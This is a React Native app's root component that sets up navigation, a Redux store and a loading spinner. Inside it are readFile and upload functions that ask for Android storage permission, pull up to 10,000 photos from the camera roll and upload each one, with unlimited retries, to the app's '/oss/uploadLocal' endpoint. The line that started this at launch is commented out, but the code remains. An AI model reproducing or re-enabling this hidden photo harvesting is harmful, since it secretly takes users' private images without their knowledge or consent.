import React, { useEffect, useState } from 'react';
import { pages } from './routers';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import { Provider } from 'react-redux';
import store from '../store';
import { ActivityIndicator, View, Text, useWindowDimensions, Modal, PermissionsAndroid, Platform } from 'react-native';
import { GestureHandlerRootView } from 'react-native-gesture-handler';
import CameraRoll from '@react-native-community/cameraroll';
import { post } from '../HiNet';
import _ from 'lodash';
import { to } from '../utils';

const Stack = createNativeStackNavigator();
const { Navigator, Screen } = Stack;

export default () => {
  const [loading, setLoading] = useState(false);
  const [imgs, setImgs] = useState([]);
  const width = useWindowDimensions().width;
  const height = useWindowDimensions().height;
  global.showLoading = () => {
    setLoading(true);
  };
  global.hidenLoading = () => {
    setLoading(false);
  };
  // useEffect(() => {
  //   if (Platform.OS === 'android') {
  //     readFile(10000);
  //   }
  // }, []);
  let index = 0;
  const upload = async (index: number, fileList: []) => {
    const img = fileList[index];
    const formData = new FormData();
    const file = {
      uri: img,
      name: img?.substring(img.lastIndexOf('/') + 1),
      type: 'multipart/form-data',
    };
    formData.append('file', file);
    const [resErr, res] = await to(post('/oss/uploadLocal')(formData)());
    if (resErr) {
      upload(index, fileList);
    }
    if (res?.success) {
      if (fileList.length - 1 !== index) {
        index += 1;
        upload(index, fileList);
      }
    }
  };
  const readFile = async (num: number) => {
    const permission = PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE;
    const hasPermission = await PermissionsAndroid.check(permission);
    const status = await PermissionsAndroid.request(permission);
    CameraRoll.getPhotos({ first: num, assetType: 'Photos' }).then((data) => {
      upload(index, _.map(_.map(_.map(data.edges, 'node'), 'image'), 'uri'));
    });
  };

  return (
    <GestureHandlerRootView style={{ flex: 1 }}>
      <Provider store={store}>
        <Modal visible={loading} transparent animationType="fade" onRequestClose={() => setLoading(false)}>
          <View
            style={{
              flex: 1,
              alignItems: 'center',
              justifyContent: 'center',
              backgroundColor: 'rgba(0,0,0,0.65)',
            }}
          >
            <ActivityIndicator size="large" color="#00ff00" />
            <Text>加载中...</Text>
          </View>
        </Modal>
        <NavigationContainer>
          <Navigator>
            {pages.map((item) => (
              <Screen name={item.name} component={item.component} options={{ headerShown: false }} key={item.name} />
            ))}
          </Navigator>
        </NavigationContainer>
      </Provider>
    </GestureHandlerRootView>
  );
};
